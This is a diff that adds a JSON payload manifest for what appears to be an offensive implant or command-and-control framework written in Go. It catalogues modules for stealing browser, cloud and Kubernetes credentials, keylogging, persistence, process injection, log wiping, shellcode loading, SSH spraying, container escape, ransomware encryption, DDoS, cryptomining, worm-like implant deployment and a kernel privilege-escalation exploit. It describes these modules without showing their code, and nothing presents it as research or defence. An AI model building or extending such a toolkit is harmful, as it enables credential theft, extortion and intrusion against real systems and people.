@@ -1,0 +1,30 @@
+{
+  "version": "3.0.0",
+  "note": "Payloads now built as native Go binaries. Each payload is available in-process via the payloads registry (internal/payloads/). Python files are kept for reference only.",
+  "payloads": [
+    {"name": "sysrecon", "file": "sysrecon.go", "category": "recon", "desc": "Full system enumeration", "platform": "all", "args": ""},
+    {"name": "cloud_detector", "file": "cloud_detector.go", "category": "recon", "desc": "Detect cloud environment (AWS/Azure/GCP/DigitalOcean/Docker/K8s)", "platform": "all", "args": ""},
+    {"name": "linpeas_light", "file": "linpeas.go", "category": "recon", "desc": "Lightweight Linux PEAS scanner (sudo perms, SUID, cron, capabilities, kernel exploits)", "platform": "linux", "args": ""},
+    {"name": "browserstealer", "file": "browserstealer.go", "category": "credential", "desc": "Extract saved browser credentials, cookies, and history from Chrome/Firefox/Edge/Brave", "platform": "linux", "args": ""},
+    {"name": "hashdump", "file": "hashdump.go", "category": "credential", "desc": "Dump password hashes from /etc/shadow, SSH keys, browser creds", "platform": "linux", "args": ""},
+    {"name": "aws_cred_stealer", "file": "aws_cred_stealer.go", "category": "credential", "desc": "Harvest AWS credentials from metadata endpoint, env vars, config files, disk", "platform": "all", "args": ""},
+    {"name": "azure_cred_harvester", "file": "azure_cred_harvester.go", "category": "credential", "desc": "Harvest Azure tokens/credentials from metadata, env, CLI config, Key Vaults", "platform": "all", "args": ""},
+    {"name": "k8s_secret_stealer", "file": "k8s_secret_stealer.go", "category": "credential", "desc": "Extract K8s secrets, config files, service account tokens", "platform": "linux", "args": ""},
+    {"name": "keylogger", "file": "keylogger.go", "category": "collection", "desc": "Log keystrokes via xinput/test or showkey", "platform": "linux", "args": "duration=30"},
+    {"name": "screenshot", "file": "screenshot.go", "category": "collection", "desc": "Capture screen via import/xwd/scrot", "platform": "linux", "args": ""},
+    {"name": "persist_cron", "file": "persistence.go", "category": "persistence", "desc": "Establish persistence via cron, systemd timers, at jobs", "platform": "linux", "args": "implant_path"},
+    {"name": "process_inject", "file": "process_inject.go", "category": "persistence", "desc": "Linux process injection via ptrace (requires root)", "platform": "linux", "args": "pid,name,shellcode"},
+    {"name": "filehider", "file": "filehider.go", "category": "evasion", "desc": "Hide files via chattr, extended attributes, ACLs, timestomping", "platform": "linux", "args": "dir"},
+    {"name": "logcleaner", "file": "logcleaner.go", "category": "evasion", "desc": "Clean system logs (auth.log, syslog, journald, wtmp, btmp, bash_history)", "platform": "linux", "args": "level=moderate"},
+    {"name": "polyloader", "file": "polyloader.go", "category": "evasion", "desc": "Polymorphic XOR loader for shellcode execution", "platform": "all", "args": "shellcode,key"},
+    {"name": "sshspray", "file": "sshspray.go", "category": "lateral", "desc": "SSH credential spraying with goroutine worker pool", "platform": "all", "args": "targets,usernames,passwords,threads=5,timeout=5"},
+    {"name": "container_escape", "file": "container_escape.go", "category": "lateral", "desc": "Container escape techniques (privileged check, cgroup mount, nsenter)", "platform": "linux", "args": ""},
+    {"name": "fileransom", "file": "fileransom.go", "category": "impact", "desc": "AES-256-GCM file encryption with ransom note", "platform": "linux", "args": "target,mode,password"},
+    {"name": "ddos", "file": "ddos.go", "category": "impact", "desc": "Multi-method DDoS (HTTP, TLS, UDP, TCP, Slow POST, combo)", "platform": "all", "args": "target,port,duration,threads,mode"},
+    {"name": "competitor_cleaner", "file": "competitor_cleaner.go", "category": "impact", "desc": "Detect and remove competing implants, backdoors, and miners", "platform": "linux", "args": ""},
+    {"name": "copyfail", "file": "copyfail.go", "category": "exploit", "desc": "CVE-2026-31431 Copy Fail: Linux kernel LPE via AF_ALG page-cache corruption (kernels 4.14+)", "platform": "linux", "args": "target,offset,write_byte"},
+    {"name": "dnstunnel", "file": "dnstunnel.go", "category": "exfiltration", "desc": "DNS tunneling module for stealthy C2 communication", "platform": "all", "args": "domain,data,mode"},
+    {"name": "mine", "file": "mine.go", "category": "impact", "desc": "Monero (XMR) miner connecting to a stratum pool", "platform": "all", "args": "wallet,pool,port,threads"},
+    {"name": "autodeploy", "file": "autodeploy.go", "category": "lateral", "desc": "Auto-discover hosts via network scanning and deploy implants via SSH", "platform": "linux", "args": "network,implant_url,threads"}
+  ]
+}
